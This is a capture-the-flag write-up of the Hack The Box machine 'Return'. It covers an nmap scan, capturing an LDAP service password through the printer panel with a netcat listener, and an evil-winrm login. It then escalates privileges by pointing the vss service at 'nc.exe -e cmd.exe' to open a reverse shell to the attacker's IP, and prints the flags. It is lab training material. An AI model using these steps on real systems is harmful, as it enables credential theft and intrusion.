# Return

### Challenge: FullPWN

### Tools: Nmap, FTP, SSH, Linpeas, Python

THe nmap scan shows alot of information but most notable are HTTP and LDAP. Running DIRB did not give much and scanning for vulnerabilities did not show anything for any of the ports either.

```console
└──╼ [★]$ sudo nmap -sC -A -O 10.129.95.241
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 20:18 BST
Nmap scan report for 10.129.95.241
Host is up (0.0046s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-12 19:37:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/12%OT=53%CT=1%CU=34314%PV=Y%DS=2%DC=T%G=Y%TM=62F6A7A
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=
OS:U)OPS(O1=M539NW8NNS%O2=M539NW8NNS%O3=M539NW8%O4=M539NW8NNS%O5=M539NW8NNS
OS:%O6=M539NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
OS:DF=Y%T=80%W=FFFF%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-12T19:37:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 18m36s

TRACEROUTE (using port 21/tcp)
HOP RTT     ADDRESS
1   5.45 ms 10.10.14.1
2   4.93 ms 10.129.95.241

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.06 seconds
```

By navigating to the webpage and settings we can see our way in. All we gotta do is change the IP and set up a listner on our end.

![image](https://user-images.githubusercontent.com/105310322/184442861-f83d4bd0-3018-48ad-b55d-00fe9a9ce10b.png)

Once we connect we can see that it popped out what looks like a password so lets see where we can use it.

```console
└──╼ [★]$ sudo nc -lvnp 389
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::389
Ncat: Listening on 0.0.0.0:389
Ncat: Connection from 10.129.95.241.
Ncat: Connection from 10.129.95.241:54957.
0*`%return\svc-printer�
                       1edFg43012!!
```
Using evil-winrm works to let us login as the service account and grab our first flag.

```cnosole
└──╼ [★]$ evil-winrm -i 10.129.95.241 -u svc-printer
Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```
```console
*Evil-WinRM* PS C:\Users\svc-printer> cat Desktop/user.txt
572404b45e49f57e4014851b47458ab4
```
I struggled for a bit on privilege escalating here until I got some help with the group permission *Server Operators* With this membership we can get our reverse shell.

```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/12/2022 2:17:55 PM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
Set up your listener and then input the following commands on the victim. (nc.exe was not installed by default on pwnbox and sudo apt install windows-binaries was not working for me so I manually downloaded it)

```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /home/htb-0xrogue/Downloads/nc.exe
Info: Uploading /home/htb-0xrogue/Downloads/nc.exe to C:\Users\svc-printer\Documents\nc.exe

                                                             
Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.93 1234"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
```
This shell is very unstable and only lasts about 60 sec but it is just enough time to read the root flag!

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
8e5dd6807afea34697b12d6c823e6482
```

GG!
